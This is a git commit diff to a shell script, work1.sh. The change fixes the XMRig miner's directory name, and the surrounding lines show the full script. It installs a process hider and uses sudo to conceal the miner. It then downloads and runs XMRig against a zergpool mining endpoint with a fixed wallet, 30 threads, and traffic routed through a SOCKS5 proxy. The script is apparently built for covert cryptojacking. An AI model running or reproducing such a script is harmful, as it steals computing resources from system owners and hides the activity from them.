42183f637f99655fc1993463302351bf8fbb4563
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-05 08:29:00 +0800

    Update work1.sh

--- work1.sh
+++ work1.sh
@@ -7,6 +7,6 @@ npm i -g node-process-hider;
 sudo ph add xmrig;
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz;
 tar -zxf xmrig-6.16.4-bionic-x64.tar.gz;
-cd xmrig-6.16.2;
+cd xmrig-6.16.4;
 chmod +x xmrig;
 ./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci -p c=BTC,mc=GNTL --threads=30 -x socks5://192.252.214.20:15864;
